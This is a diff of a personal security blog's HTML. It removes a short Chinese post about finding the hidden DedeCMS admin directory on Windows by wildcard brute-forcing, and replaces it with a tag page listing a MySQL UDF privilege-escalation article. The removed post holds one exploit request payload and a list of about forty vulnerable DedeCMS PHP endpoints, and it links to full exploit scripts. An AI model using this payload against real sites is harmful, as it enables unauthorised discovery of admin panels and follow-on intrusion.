@@ -11,15 +11,15 @@
   <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
   
   
-    <meta name="keywords" content="通配符," />
+    <meta name="keywords" content="" />
   
 
   
-    <meta name="description" content="dede通配符爆破后台~" />
+    <meta name="description" content="Life&#39;s blog," />
   
   
   <link rel="icon" type="image/x-icon" href="/logo.jpg">
-  <title>dede通配符爆破后台~ [ Life&#39;s blog ]</title>
+  <title>tag: mysql udf [ Life&#39;s blog ]</title>
   
     <!-- stylesheets list from config.yml -->
     
@@ -72,155 +72,22 @@
 
   <div class="container" id="content-outer">
     <div class="inner" id="content-inner">
-      <div class="post-container">
-  <article class="post" id="post">
-    <header class="post-header text-center">
-      <h1 class="title">
-        dede通配符爆破后台~
-      </h1>
-      <span>
-        
-        <time class="time" datetime="2018-03-03T04:37:18.000Z">
-        2018-03-03
+      
+<div class="page tag-page" id="tag">
+  <h3 title="mysql udf下的文章">mysql udf</h3>
+  
+    <div class="tag-item">
+      
+        <a href="/2019/05/21/mysql_udf_sys_bineval/">
+          udf提权之sys_bineval
+        </a>
+      
+      <time class="time" datetime="2019-05-21T13:33:51.000Z">
+        2019-05-21
       </time>
-        
-      </span>
-      <span class="slash">/</span>
-      <span class="post-meta">
-      <span class="post-tags">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/通配符/">通配符</a></li></ul>
-      </span>
-    </span>
-      <span class="slash">/</span>
-      <span class="read">
-      <span id="busuanzi_value_page_pv"></span> 点击
-    </span>
-    </header>
-
-    <div class="post-content">
-      <h3 id="emmmmmm，再也不用担心找不到dede的后台了-只支持win"><a href="#emmmmmm，再也不用担心找不到dede的后台了-只支持win" class="headerlink" title="emmmmmm，再也不用担心找不到dede的后台了~~(只支持win)"></a>emmmmmm，再也不用担心找不到dede的后台了~~(只支持win)</h3><ul>
-<li><p><strong>exp(php):<a href="https://xianzhi.aliyun.com/forum/topic/2064" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/2064</a></strong></p>
-</li>
-<li><p><strong>exp(python3):<a href="https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/</a></strong></p>
-<ul>
-<li>这个地方要说一下，包含了common.inc.php的都可以跑…..</li>
-</ul>
-</li>
-</ul>
-<h3 id="预防tags-php和index-php不能跑，这里我总结了一下可以利用的php"><a href="#预防tags-php和index-php不能跑，这里我总结了一下可以利用的php" class="headerlink" title="预防tags.php和index.php不能跑，这里我总结了一下可以利用的php:"></a>预防tags.php和index.php不能跑，这里我总结了一下可以利用的php:</h3><ul>
-<li><strong>这里二级目录爆破的话，exp的语句需要改一下</strong></li>
-</ul>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dopost=save&amp;_FILES[b4dboy][tmp_name]=../$v$vv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif</span><br></pre></td></tr></table></figure>
-<blockquote>
-<ul>
-<li>/install/module_autos.php</li>
-<li>/m/index.php</li>
-<li>/m/list.php</li>
-<li>/m/view.php</li>
-<li>/member/config.php</li>
-<li>/plus/ad_js.php</li>
-<li>/plus/advancedsearch.php</li>
-<li>/plus/arcmulti.php</li>
-<li>/plus/bookfeedback.php</li>
-<li>/plus/bookfeedback_js.php</li>
-<li>/plus/car.php</li>
-<li>/plus/carbuyaction.php</li>
-<li>/plus/comments_frame.php</li>
-<li>/plus/count.php</li>
-<li>/plus/digg_ajax.php</li>
-<li>/plus/digg_frame.php</li>
-<li>/plus/disdls.php</li>
-<li>/plus/diy.php</li>
-<li>/plus/download.php</li>
-<li>/plus/erraddsave.php</li>
-<li>/plus/feedback.php</li>
-<li>/plus/feedback_ajax.php</li>
-<li>/plus/feedback_js.php</li>
-<li>/plus/flink.php</li>
-<li>/plus/flink_add.php</li>
-<li>/plus/freelist.php</li>
-<li>/plus/guestbook.php</li>
-<li>/plus/heightsearch.php</li>
-<li>/plus/list.php</li>
-<li>/plus/mytag_js.php</li>
-<li>/plus/posttocar.php</li>
-<li>/plus/qrcode.php</li>
-<li>/plus/recommend.php</li>
-<li>/plus/rss.php</li>
-<li>/plus/search.php</li>
-<li>/plus/showphoto.php</li>
-<li>/plus/stow.php</li>
-<li>/plus/task.php</li>
-<li>/plus/view.php</li>
-<li>/plus/vote.php</li>
-</ul>
-</blockquote>
-
     </div>
-
-    <div>全文完。</div>
-  </article>
-  <div class="toc-container">
-    
-  <div id="toc" class="toc-article">
-    <strong class="toc-title">目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#emmmmmm，再也不用担心找不到dede的后台了-只支持win"><span class="toc-text">emmmmmm，再也不用担心找不到dede的后台了~~(只支持win)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#预防tags-php和index-php不能跑，这里我总结了一下可以利用的php"><span class="toc-text">预防tags.php和index.php不能跑，这里我总结了一下可以利用的php:</span></a></li></ol>
-  </div>
-
-
-  </div>
+  
 </div>
-<div class="copyright">
-    <span>本作品采用</span>
-    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
-    <span>进行许可。 转载时请注明原文链接。</span>
-</div>
-  
-    <div class="post-nav">
-      <div class="post-nav-item post-nav-next">
-        
-          <span>〈 </span>
-          <a href="/2018/01/12/win-download/" rel="next" title="win远程下载文件的各种姿势~">
-          win远程下载文件的各种姿势~
-          </a>
-        
-      </div>
-  
-      <div class="post-nav-item post-nav-prev">
-          
-          <a href="/2018/03/16/ubuntu内核提权复现/" rel="prev" title="ubuntu本地提权复现">
-            ubuntu本地提权复现
-          </a>
-          <span>〉</span>
-        
-      </div>
-    </div>
-  
-
-  <section class="disqus-comments">
-    <div id="disqus_thread">
-      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-    </div>
-  </section>
-
-  <script>
-    var disqus_shortname = 'XXX';
-    
-    var disqus_url = 'http://life-time.me/2018/03/03/dede通配符爆破后台/';
-    
-    (function(){
-      var dsq = document.createElement('script');
-      dsq.type = 'text/javascript';
-      dsq.async = true;
-      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-  </script>
-
-  <script id="dsq-count-scr" src="//XXX.disqus.com/count.js" async></script>
-
-
-
     </div>
 
     
